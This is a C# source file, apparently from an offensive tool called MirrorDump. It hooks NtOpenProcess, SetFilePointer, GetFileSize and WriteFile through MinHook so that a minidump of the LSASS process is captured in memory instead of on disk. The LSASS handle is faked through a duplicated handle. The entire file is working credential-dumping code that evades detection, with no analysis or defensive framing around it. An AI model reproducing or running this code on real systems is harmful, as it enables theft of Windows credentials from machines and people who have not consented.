using MinHook;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static MirrorDump.WinAPI;

namespace MirrorDump {
    internal class MiniDumpToMem {

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
           IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,
           uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

        internal class DumpContext {
            public byte[] Data { get { return data; } }
            public uint Size { get; set; }
            public uint CurrentOffset { get; set; }
            public uint Limit { get; private set; }
            public uint ResizeIncrement { get; private set; }
            
            byte[] data;

            public DumpContext(uint limit = 0, uint resizeIncrement = 1024 * 1024 * 10) {
                Limit = limit;
                ResizeIncrement = resizeIncrement;
                data = new byte[0];
            }

            public void Resize(uint newSize) {

                if (newSize % ResizeIncrement != 0)
                    newSize = (newSize - newSize % ResizeIncrement) + ResizeIncrement;

                Array.Resize(ref data, (int)newSize);
            }
        }

        internal enum MoveMethod : uint {
            Begin,
            Current,
            End
        }

        delegate int NtOpenProcessDelegate(IntPtr ProcessHandle, uint desiredAccess, IntPtr ObjectAttributes, IntPtr ClientId);
        delegate uint GetFileSizeDelegate(IntPtr fileHandle, out uint fileSizeHigh);
        delegate uint SetFilePointerDelegate(IntPtr fileHandle, int distanceToMove, ref int distanceToMoveHigh, MoveMethod moveMethod);
        delegate bool WriteFileDelegate(IntPtr fileHandle, IntPtr buffer, uint numberOfBytesToWrite, out uint numberOfBytesWritten, IntPtr overlapped);

        static NtOpenProcessDelegate NtOpenProcess_orig, NtOpenProcess_detour;
        static GetFileSizeDelegate GetFileSize_orig, GetFileSize_detour;
        static SetFilePointerDelegate SetFilePointer_orig, SetFilePointer_detour;
        static WriteFileDelegate WriteFile_orig, WriteFile_detour;
        static HookEngine hookEngine;
        static Dictionary<IntPtr, DumpContext> dumpContexts = new Dictionary<IntPtr, DumpContext>();
        
        static int lsassPid;
        static IntPtr lsassHandle;

        internal static DumpContext GetDumpContextFromHandle(IntPtr handle) {
            if (dumpContexts.ContainsKey(handle))
                return dumpContexts[handle];
            else
                return null;
        }

        static int NtOpenProcess(IntPtr ProcessHandle, uint desiredAccess, IntPtr ObjectAttributes, IntPtr ClientId) {

            int pid = Marshal.ReadInt32(ClientId);
            if(pid != lsassPid)
                return NtOpenProcess_orig(ProcessHandle, desiredAccess, ObjectAttributes, ClientId);

            IntPtr currentProcess = new IntPtr(-1);
            IntPtr newLsassHandle;

            if(!DuplicateHandle(currentProcess, lsassHandle, currentProcess, out newLsassHandle, 0, false, 0x2)) {
                Console.WriteLine("[!] Failed to fake NtOpenProcess on LSASS PID");
                return Marshal.GetLastWin32Error();
            }

            Marshal.WriteIntPtr(ProcessHandle, newLsassHandle);
            return 0;
        }
            

        static uint GetFileSize(IntPtr fileHandle, out uint fileSizeHigh) {

            DumpContext dc = GetDumpContextFromHandle(fileHandle);
            if (dc == null)
                return GetFileSize_orig(fileHandle, out fileSizeHigh);

            fileSizeHigh = 0;
            return dc.Size;
        }

        static uint SetFilePointer(IntPtr fileHandle, int distanceToMove, ref int distanceToMoveHigh, MoveMethod moveMethod) {

            DumpContext dc = GetDumpContextFromHandle(fileHandle);
            if (dc == null)
                return SetFilePointer_orig(fileHandle, distanceToMove, ref distanceToMoveHigh, moveMethod);

            switch (moveMethod) {
                case MoveMethod.Begin:
                    dc.CurrentOffset = (uint)distanceToMove;
                    break;
                case MoveMethod.Current:
                    dc.CurrentOffset = (uint)(dc.CurrentOffset + distanceToMove);
                    break;
                case MoveMethod.End:
                    dc.CurrentOffset = (uint)(dc.Size + distanceToMove);
                    break;
                default:
                    return 0xffffffff;
            }

            return dc.CurrentOffset;
        }

        static bool WriteFile(IntPtr fileHandle, IntPtr buffer, uint numberOfBytesToWrite, out uint numberOfBytesWritten, IntPtr overlapped) {

            DumpContext dc = GetDumpContextFromHandle(fileHandle);
            if (dc == null)
                return WriteFile_orig(fileHandle, buffer, numberOfBytesToWrite, out numberOfBytesWritten, overlapped);

            if (dc.Limit != 0 && dc.CurrentOffset + numberOfBytesToWrite > dc.Limit) {
                SetLastError(ERROR_DISK_FULL);
                numberOfBytesWritten = 0;
                return false;
            } else if (dc.CurrentOffset + numberOfBytesToWrite > dc.Data.Length) {
                Console.Write(".");
                dc.Resize(dc.CurrentOffset + numberOfBytesToWrite);
            }

            Marshal.Copy(buffer, dc.Data, (int)dc.CurrentOffset, (int)numberOfBytesToWrite);
            dc.CurrentOffset += numberOfBytesToWrite;
            numberOfBytesWritten = numberOfBytesToWrite;

            int growth = (int)dc.CurrentOffset - (int)dc.Size;
            if (growth > 0) {
                dc.Size += (uint)growth;
            }

            return true;
        }

        internal static void InitHookEngine(IntPtr contextHandle, uint dumpSizeLimit, int lsassPid, IntPtr lsassHandle) {

            hookEngine = new HookEngine();
            dumpContexts[contextHandle] = new DumpContext(dumpSizeLimit);
            MiniDumpToMem.lsassPid = lsassPid;
            MiniDumpToMem.lsassHandle = lsassHandle;

            SetFilePointer_detour = new SetFilePointerDelegate(SetFilePointer);
            GetFileSize_detour = new GetFileSizeDelegate(GetFileSize);
            WriteFile_detour = new WriteFileDelegate(WriteFile);
            NtOpenProcess_detour = new NtOpenProcessDelegate(NtOpenProcess);

            NtOpenProcess_orig = hookEngine.CreateHook("ntdll.dll", "NtOpenProcess", NtOpenProcess_detour);
            SetFilePointer_orig = hookEngine.CreateHook("kernelbase.dll", "SetFilePointer", SetFilePointer_detour);
            GetFileSize_orig = hookEngine.CreateHook("kernelbase.dll", "GetFileSize", GetFileSize_detour);
            WriteFile_orig = hookEngine.CreateHook("kernelbase.dll", "WriteFile", WriteFile_detour);

            hookEngine.EnableHooks();
        }

        internal static void ShutdownHookEngine() {
            hookEngine.DisableHooks();
        }
    }
}
